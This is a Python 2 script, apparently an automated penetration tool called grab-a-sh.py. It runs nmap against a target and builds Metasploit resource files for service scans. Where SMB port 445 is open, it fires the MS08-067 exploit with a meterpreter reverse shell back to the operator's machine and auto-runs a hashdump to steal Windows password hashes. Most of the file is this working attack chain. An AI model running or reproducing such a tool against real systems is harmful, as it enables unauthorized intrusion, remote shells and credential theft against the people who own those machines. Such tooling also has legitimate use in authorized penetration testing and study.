#!/usr/bin/env python
# grab-a-sh.py  
# version just1.
# idea : 05082016
# by code610
#

# imports
import sys
import subprocess
import os
import datetime 	# for 'now'

# defines 
target = sys.argv[1]
pwd = os.getcwd()
allLogs = pwd + '/logs/'
tLogDir = allLogs + target + '/'
rcfile = tLogDir + 'msf.rc'
rcwww = tLogDir + 'www.rc'
rcspool = tLogDir + 'output.msf'
wwwspool = tLogDir + 'output.www'
nmaplogfile = tLogDir + '/nmap-tcp-' + target + '.log'
now = datetime.datetime.now()
today = now.strftime("%d-%m-%Y %H:%M")
postfile = 'post.rc'
path2post = tLogDir + postfile


# test functions:
def check_22(target):
  print '    + loading : ssh modules...'
  saveNetRc('use auxiliary/scanner/ssh/ssh_version\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')


def check_http(target, rport):
  print '    + loading : http modules ...'
  print '      + http_header'
  saveNetRc('use auxiliary/scanner/http/http_header\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + dir_scanner'
  saveNetRc('use auxiliary/scanner/http/dir_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set THREADS 10\n')
  saveNetRc('set DICTIONARY /usr/share/dirb/wordlists/common.txt\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + trace'
  saveNetRc('use auxiliary/scanner/http/trace\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + options'
  saveNetRc('use auxiliary/scanner/http/options\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + robots_txt'
  saveNetRc('use auxiliary/scanner/http/robots_txt\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + scrapper (get Title)'
  saveNetRc('use use auxiliary/scanner/http/scraper\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


def check_apache(target, rport):
  print '    + loading : apache modules ...'
  print '      + apache_userdir_enum' 
  saveNetRc('use auxiliary/scanner/http/apache_userdir_enum\n')
  saveNetRc('set VERBOSE false\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

def check_iis(target, rport):
  print '    + loading : iis modules ...'
  print '     + webdav_scanner'
  saveNetRc('use auxiliary/scanner/http/webdav_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


def check_joomla(target,rport):
  print '    + loading : joomla modules ...'
  saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('run\n')

  saveWWWRc('use auxiliary/scanner/http/joomla_plugins\n')
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('run\n')


def check_git(target, rport):
  print '    + loading : git modules ...'
  saveNetRc('use auxiliary/scanner/http/git_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


def check_http_dirs(target): 
  fp = open(rcspool,'r') # read from msf.net output file
  lines = fp.readlines()
  
  print '[+] Preparing HTTP attacks basing on found directories'
  for line in lines:
    if line.find('Found http://') != -1:
      if line.find('/administrator/') != -1:
        print '  [+] probably Joomla; preparing tests...'
        check_joomla(target,rport)
      elif line.find('.git') != -1:
        print '  [+] probably git found; preparing tests...'
        check_git(target, rport)


def check_443(target, rport):
  print '    + loading : 443 modules ...'
  print '      + http_hsts'
  saveNetRc('use use auxiliary/scanner/http/http_hsts\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


  print '      + cert'
  saveNetRc('use auxiliary/scanner/http/cert\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT '  + rport + '\n')
  saveNetRc('run\n')

  print '      + ssl'
  saveNetRc('use auxiliary/scanner/http/ssl\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  print '      + ssl_version'
  saveNetRc('use auxiliary/scanner/http/ssl_version\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


def check_445(target):
  print '    + loading : 445 modules ...'
  saveNetRc('use exploit/windows/smb/ms08_067_netapi\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('set PAYLOAD windows/meterpreter/reverse_tcp\n')
  saveNetRc('set EndOnSession true\n')
  saveNetRc('set LHOST ' + str(elhost()) + '\n')
  makePost(path2post)
  saveNetRc('set AutoRunScript multi_console_command -rc ' + path2post + '\n')
  saveNetRc('run\n')


def check_2869(target):
  print '    + loading : 2869 modules ...'
  print '      + ssdp_msearch'
  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  print '      + ssdp_amp'
  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')


def check_5357(target):
  print '    + loading : 5357 modules ...'
  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')




# code functions:
def elhost(): # for LHOST
  f = os.popen('/sbin/ifconfig eth0 | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1')
  lhost=f.read()
  return lhost

def makePost(postme):
  fp = open(path2post,'w')

  fp.write('sysinfo\n')
  fp.write('run post/windows/gather/hashdump\n')
  fp.write('exit\n')
  fp.write('exit\n')
  fp.write('exit\n') # TODO: make-meterpreter-exit bug



def readSpool(RCfp):
  print '[+] Reading spool from : ', RCfp

  check_http_dirs(target)

  print '[+] Finished reading spool from : ', RCfp

def runMsfScan(RCfp):
  print '[i] Starting Metasploit with RC file : ', RCfp
  exe = 'msfconsole -r ' + RCfp
  subprocess.call([ exe ], shell=True)
  print '[+] Finished Metasploit tests for : ', RCfp

def saveWWWRc(line):
  fp = open(rcwww, 'a+')
  fp.write(line)

def saveNetRc(line):
  fp = open(rcfile, 'a+')
  fp.write(line)


def readScan(nmaplogfile):
  print '[+] Reading scan log...'

  fp = open(nmaplogfile,'r')
  ports = fp.readlines()

  for port in ports:
    if port.find('open') != -1:

      tmp_port = port.split('/')
      global rport 
      rport = tmp_port[0]

      if port.find('22/tcp') != -1:
        print '[i] SSH found on port :', rport
        check_22(target)

      elif port.find('http') != -1:
        print '[i] HTTP found on port: ', rport
        check_http(target, rport) # test for all http
        if port.find('Apache') != -1:
          print '[i] Probably Apache; preparing...'
          check_apache(target, rport)
        elif port.find('IIS') != -1:
          print '[i] Probably IIS; preparing...'
          check_iis(target, rport)

      elif port.find('443/tcp') != -1:
        print '[i] HTTPS found on port: ', rport
        check_443(target, rport)
      

      elif port.find('445/tcp') != -1:
        print '[i] MS-DC Active Directory found on port: ', rport
        check_445(target)

      elif port.find('2869/tcp') != -1:
        print '[i] SSDP/UPnP found on port: ', rport
        check_2869(target)

      elif port.find('5357/tcp') != -1:
        print '[i] SSDP/UPnP found on port: ', rport
        check_5357(target)

  saveNetRc('exit\n')
  saveWWWRc('exit\n')
  print '[i] Reding log file : done.'

def scan(target):
  print '[+] Scanning :', target
  
  exe = 'nmap -sV -T4 -A -P0 -vv -n ' + target + ' -oN ' + nmaplogfile
  print '[+] Started!'
  subprocess.call([ exe ], shell=True)
  print '[+] Finished.'

def moveRc(fp):
  moveme = 'mv ' + str(fp) + ' ' + str(fp) + '.old'
  subprocess.call([ moveme], shell=True)

def prepareEnv():
  print '[+] Preparing environment...'

  # look for old RC files
  if os.path.exists(rcfile):
    print '[!] Old RC file found; moving...'
    moveRc(rcfile)

  if os.path.exists(rcwww):
    print '[!] Old WWW RC file found; moving...'
    moveRc(rcwww)

  # create log dirs
  print '[i] Checking for log directory : ' + allLogs 

  if os.path.isdir(allLogs) != -1:
    try:
      os.mkdir(allLogs)
      print '[+] Log directory created : ' + allLogs
    except OSError, e:
      print '[+] Log directory is already there'

  print '[i] Checking target directory: ' + tLogDir
  if os.path.isdir(tLogDir) != -1:
    try: 
      os.mkdir(tLogDir)
      print '[+] Directory for target should be here: ' + tLogDir
    except OSError, e:
      print '[+] Log directory for target is already created.'

  # preparing RC files (1st line 'spool' to log outputs)
  print '[i] Preparing RC files: '
  if os.path.isfile(rcfile) != -1:
    try:
      fp = open(rcfile,'a+')
      fp.write('spool ' + rcspool + '\n')
      print '[+] Network RC file created at : ' + rcfile
    except OSError, e:
      print e

  if os.path.isfile(rcwww) != -1:
    try:
      fp = open(rcwww, 'a+')
      fp.write('spool ' + wwwspool + '\n')
      print '[+] HTTP RC file created at : ' + rcwww
    except OSError, e:
      print e
  


def sayHi():
  print ''
  print '*'*80
  print '\t\t\t\tgrabash.py'
  print '*'*80
  print ''
  print '[i] Test started : ', today


# MAIN starter:
# ...
sayHi()
prepareEnv()
scan(target)

readScan(nmaplogfile)
runMsfScan(rcfile)
readSpool(rcspool) 

runMsfScan(rcwww)
#readSpool(rcwww)

# more:
# http://code610.blogspot.com
#
# cheers :)

